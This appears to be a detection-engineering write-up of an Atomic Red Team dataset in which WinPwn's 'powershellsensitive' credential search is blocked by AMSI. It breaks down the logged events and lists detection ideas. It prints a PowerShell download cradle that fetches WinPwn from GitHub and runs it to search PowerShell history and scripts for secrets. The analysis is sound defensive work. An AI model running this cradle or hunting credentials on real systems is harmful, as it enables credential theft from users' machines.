# T1552.001-9: Credentials In Files — WinPwn powershellsensitive

## Technique Context

T1552.001 (Credentials in Files) includes the targeting of PowerShell-specific credential storage locations. WinPwn's `powershellsensitive` function searches for credential material in PowerShell-related file locations: the command history file (`ConsoleHost_history.txt` at `AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\`), PowerShell profile scripts (`$PROFILE` paths), module files (`.psm1`, `.psd1`), and any `.ps1` scripts accessible to the running user. The function scans these locations for patterns matching API keys, passwords, access tokens, and similar secrets that may have been typed into PowerShell sessions or embedded in scripts.

This attack surface is meaningful because PowerShell history files capture every command a user runs interactively — including any commands that contain credentials passed as inline parameters. Administrators who run commands like `Connect-MsolService -Credential (Get-Credential)` or `Invoke-RestMethod -Headers @{Authorization="Bearer TOKEN"}` accumulate those credentials in plaintext in `ConsoleHost_history.txt`.

Like the other WinPwn tests in this series (7–12), the script is fetched from GitHub at runtime. Despite disabling Defender, AMSI remained active and blocked WinPwn before `powershellsensitive` could run — the same outcome as the defended variant.

## What This Dataset Contains

The dataset spans approximately twelve seconds of telemetry (2026-03-17T17:20:11Z–17:20:23Z) across four log sources, with 150 total events.

**Security EID 4688 — four process creates:**
1. `whoami.exe` (PID 0x4770) — ART pre-check
2. Attack `powershell.exe` child (PID 0x3c54):
   ```
   "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
   powershellsensitive -consoleoutput -noninteractive}
   ```
3. `whoami.exe` (PID 0x4220) — intermediate check
4. Post-cleanup `powershell.exe` (PID 0x45a0)

**Sysmon EID breakdown — 31 events: 17 EID 7, 4 EID 1, 4 EID 10, 2 EID 17, 2 EID 11, 1 EID 3, 1 EID 22:**

- **EID 22 (DNS Query)**: `raw.githubusercontent.com` resolved successfully to the GitHub CDN IPs.
- **EID 3 (Network Connection)**: Outbound TCP from the attack `powershell.exe` to the GitHub CDN — the download completed.
- **EID 1 (Process Create)**: The attack `powershell.exe` child (PID 15444) is tagged `technique_id=T1083,technique_name=File and Directory Discovery` — reflecting the file search intent of `powershellsensitive`. The cleanup `powershell.exe` (PID 17824) has a command line of `"powershell.exe" & {}`, which is the ART test framework invoking an empty cleanup block when no cleanup is defined.
- **EID 11 (File Create)**: Two events. One is the `MsMpEng.exe` creating `C:\Windows\Temp\01dcb63256b33b76` — the Defender scanning engine's temporary artifact from evaluating the downloaded WinPwn content. The second is a PowerShell profile data file.
- **EID 10 (Process Access)**: Four events documenting the test framework PowerShell opening child processes with `GrantedAccess: 0x1FFFFF`.

**PowerShell — 113 events: 110 EID 4104, 2 EID 4103, 1 EID 4100:**
The EID 4100 block is identical to other WinPwn tests: `ScriptContainedMaliciousContent`. The EID 4103 module log records `New-Object net.webclient`. The EID 4104 blocks include the attack command block with `powershellsensitive` as the named function.

**Application — 2 EID 15 events:**
Defender state-machine events.

## What This Dataset Does Not Contain

The `powershellsensitive` function never ran. AMSI blocked the WinPwn script before it was parsed, meaning the function definition was never evaluated and no PowerShell history file access occurred. The primary target of this function — `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` — was not read. No file access events, no pattern matching results, and no credential content appear in the data.

Because the execution context was `NT AUTHORITY\SYSTEM` (via the QEMU guest agent), the PowerShell history file for the interactive user accounts would not be in the SYSTEM profile path that was searched anyway. A real attacker running as a compromised user account would have immediate access to that user's history file.

## Assessment

This dataset is structurally equivalent to T1552.001-7 and T1552.001-8 from a telemetry standpoint. The distinguishing artifact is the `powershellsensitive` function name in the Security EID 4688 command line and PowerShell EID 4104 script blocks. The presence of a MsMpEng.exe EID 11 temp file (shared with T1552.001-7 but not T1552.001-8) confirms the AV engine actively processed the download. The 12-second capture window is the widest in the WinPwn series, suggesting this execution cycle had a slightly longer network or AMSI evaluation latency. The `T1083` Sysmon rule tag on the attack PowerShell process reflects the file-discovery intent correctly — even though the discovery never happened, the Sysmon config's intent-based tagging catches the right category.

## Detection Opportunities Present in This Data

1. Security EID 4688 command line containing `powershellsensitive` — this is a unique function name from WinPwn with no legitimate analog.

2. Sysmon EID 1 tagged `T1083` (File and Directory Discovery) for a `powershell.exe` process that also performs a network connection to GitHub in the same session — the combination of download cradle and file discovery classification indicates automated credential hunting.

3. PowerShell EID 4104 containing `ConsoleHost_history.txt` or `PSReadLine` in a file access or path-building context — these are the specific file targets of `powershellsensitive` and any script scanning these paths deserves scrutiny.

4. PowerShell EID 4104 containing `powershellsensitive` (case-insensitive) — direct tool name detection.

5. Sysmon EID 22 + EID 3 from `powershell.exe` to `raw.githubusercontent.com`, followed within seconds by `MsMpEng.exe` EID 11 creating a file in `C:\Windows\Temp\` — this three-event sequence (script download → AV evaluation → temp file) is characteristic of AMSI-blocked download cradles across all WinPwn tests.

6. Temporal cluster: Sysmon EID 3 (outbound connection), EID 22 (DNS query), EID 7 (DLL loads), and EID 10 (process access) all within a 5-second window from a single `powershell.exe` process — this cluster pattern appears consistently across all WinPwn tests and can serve as a behavioral signature independent of the specific function name.
